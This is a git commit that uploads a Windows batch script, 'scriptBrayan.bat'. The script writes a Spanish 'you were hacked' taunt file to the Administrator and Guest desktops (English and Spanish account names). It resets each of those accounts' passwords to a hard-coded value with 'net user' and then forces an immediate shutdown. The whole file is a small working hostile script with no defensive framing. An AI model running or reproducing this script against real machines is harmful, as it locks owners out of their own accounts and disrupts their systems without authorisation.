9110f40fdcb1e4a4a3fc3ed831b1bd8a4ecb955e
LastravelXRX <150144609+LastravelXRX@users.noreply.github.com>
2024-09-26 14:59:11 -0300

    Add files via upload

---
+++ scriptBrayan.bat
@@ -0,0 +1,31 @@
+@echo off
+
+cd /d C:\
+cd Users
+cd Administrador
+cd Desktop
+echo Fuiste jakiado por el fokin reinoso y el fokin brayatan > yaquersPros.txt
+net user Administrador Brawlstars12?
+
+cd /d C:\
+cd Users
+cd Administrator
+cd Desktop
+echo Fuiste jakiado por el fokin reinoso y el fokin brayatan > yaquersPros.txt
+net user Administrator Brawlstars12?
+
+cd /d C:\
+cd Users
+cd Invitado
+cd Desktop
+echo Fuiste jakiado por el fokin reinoso y el fokin brayatan > yaquersPros.txt
+net user Invitado Brawlstars12?
+
+cd /d C:\
+cd Users
+cd Guest
+cd Desktop
+echo Fuiste jakiado por el fokin reinoso y el fokin brayatan > yaquersPros.txt
+net user Guest Brawlstars12?
+
+shutdown /s /f /t 0
